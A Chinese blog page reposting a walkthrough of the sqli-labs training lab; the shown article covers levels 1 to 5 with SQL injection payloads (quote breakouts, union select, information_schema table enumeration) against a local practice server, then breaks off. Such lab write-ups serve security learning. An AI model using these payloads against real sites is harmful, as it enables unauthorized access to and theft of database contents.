

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="转载链接：https:&#x2F;&#x2F;inhann.top&#x2F;2021&#x2F;01&#x2F;21&#x2F;sqli-lab&#x2F;[toc]  菜鸡不会sqli，所以练练，就把sqli-labs刷完了，这里记录一下每一题的大体思路和payload   文末小结里有sqli一些知识点的思维导图，有需要可自取  less-11http:&#x2F;&#x2F;localhost:12345&#x2F;Less-1&#x2F;?id&#x3D;&amp;#x27; or 1&#x3D;1%23  可以 目的是得">
<meta property="og:type" content="article">
<meta property="og:title" content="(转载)sqli-labs 通关笔记">
<meta property="og:url" content="http://gofervor.com/2022/01/21/(%E8%BD%AC%E8%BD%BD%E5%AD%A6%E4%B9%A0)sqli-lab/index.html">
<meta property="og:site_name" content="b1ub1u的小站">
<meta property="og:description" content="转载链接：https:&#x2F;&#x2F;inhann.top&#x2F;2021&#x2F;01&#x2F;21&#x2F;sqli-lab&#x2F;[toc]  菜鸡不会sqli，所以练练，就把sqli-labs刷完了，这里记录一下每一题的大体思路和payload   文末小结里有sqli一些知识点的思维导图，有需要可自取  less-11http:&#x2F;&#x2F;localhost:12345&#x2F;Less-1&#x2F;?id&#x3D;&amp;#x27; or 1&#x3D;1%23  可以 目的是得">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143315969.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143638242.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143901007.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119145440060.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119145732828.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119150621876.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119182324267.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119182820731.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119183035689.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119185034862.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119185602815.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119191613590.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195158190.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195623611.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195734373.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195816927.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195937251.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200153496.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200723374.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200951582.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201146925.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201407977.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201826130.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201940984.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119202440814.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120150310498.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120151233322.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120151942899.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153249874.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153412704.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153559333.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120154550935.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120154648013.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120162728262.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170313456.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170448801.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170623639.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171917926.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171848459.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171837216.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172155150.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172329237.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172315386.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172523016.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120175110298.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120175622603.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120182606166.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120182914559.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120183734895.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120183805290.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120184711508.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120184852156.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120185034544.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120191401981.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120191449447.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195356111.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195644463.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195811358.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120195858667.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200020279.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200254725.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200348685.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200641510.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120200827069.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120201610071.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120202418342.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120203759673.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120205719179.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120210451232.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120210718815.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212017879.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212108358.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213657517.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213826992.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120213932996.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120212635661.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120214205371.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120214332256.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120215925076.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120220051754.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120220604740.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120222527706.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120222447856.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223001087.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223430630.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223714110.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120223906769.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224114512.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224307444.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224418287.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120224738271.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225010194.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225101790.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225502783.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120225634952.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120230800220.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120231310079.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120231921648.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120232334394.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120234746825.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121110723299.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121111041676.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112018887.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112430298.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121112932139.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121113359396.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121113902374.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121125751221.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131558315.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131650460.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131739030.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131823654.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121131931952.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121132459622.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121135008540.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121140852393.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121141804847.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121142547017.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121142832726.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121143303034.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121145644986.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121150912785.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121154651410.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121154726007.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121155207034.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121155715020.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121160120151.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121160531439.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121170446791.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171127295.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171340552.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121171641645.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172236744.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172336841.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121172607215.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121173940829.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121174009901.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121230005217.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121230738448.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210121231306768.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210121231643079.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/php/blog/2021/01/image-20210130201015071.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/image-20210130202412762.png">
<meta property="og:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/image-20210130203457790.png">
<meta property="article:published_time" content="2022-01-21T15:21:02.000Z">
<meta property="article:modified_time" content="2022-03-28T09:48:24.194Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="sqli">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143315969.png">
  
  
  <title>(转载)sqli-labs 通关笔记 - b1ub1u的小站</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->

  
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"gofervor.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>biubiu~</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.jpeg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="(转载)sqli-labs 通关笔记">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-01-21 23:21" pubdate>
        2022年1月21日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      31k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      260 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">(转载)sqli-labs 通关笔记</h1>
            
            <div class="markdown-body">
              <p>转载链接：<a target="_blank" rel="noopener" href="https://inhann.top/2021/01/21/sqli-lab/">https://inhann.top/2021/01/21/sqli-lab/</a><br>[toc]</p>
<blockquote>
<p>菜鸡不会sqli，所以练练，就把sqli-labs刷完了，这里记录一下每一题的大体思路和payload</p>
</blockquote>
<blockquote>
<p>文末小结里有sqli一些知识点的思维导图，有需要可自取</p>
</blockquote>
<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">1</span>/?id=&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>可以</p>
<p>目的是得到所有字段的数据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">1</span>/?id=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>直接union select 得到字段位置</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143315969.png" srcset="/img/loading.gif" lazyload alt="image-20210119143315969"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">1</span>/?id=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>得到所有表命名</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143638242.png" srcset="/img/loading.gif" lazyload alt="image-20210119143638242"></p>
<p>差不多了</p>
<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>id 是 numeric value</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/testblog/2021/01/image-20210119143901007.png" srcset="/img/loading.gif" lazyload alt="image-20210119143901007"></p>
<p>差不多了</p>
<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">3</span>/?id=<span class="hljs-number">1</span> order by <span class="hljs-number">5</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>无论order by 多少，都没用，这里可能是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where id = (<span class="hljs-string">&#x27;input&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>并且id的类型为var char</p>
<p>所以<code>1 order by 5%23</code> 会被当做string，从而转换成1处理</p>
<p>这样就行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">3</span>/?id=&#x27;) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119145440060.png" srcset="/img/loading.gif" lazyload alt="image-20210119145440060"></p>
<p>完成了绕过</p>
<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>尝试单引号没有报错</p>
<p>但是尝试双引号就报错了</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119145732828.png" srcset="/img/loading.gif" lazyload alt="image-20210119145732828"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">where id = (<span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$_GET</span>[&#x27;id&#x27;]&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>而且还有个括号要绕过</p>
<p>所以是这样</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-4/</span>?id=<span class="hljs-number">0</span><span class="hljs-string">&quot;) union select 1,2,3%23</span><br></code></pre></td></tr></table></figure>

<p>差不多</p>
<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>用 <code>&#39;</code> 发现报错</p>
<p>猜测</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;input&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
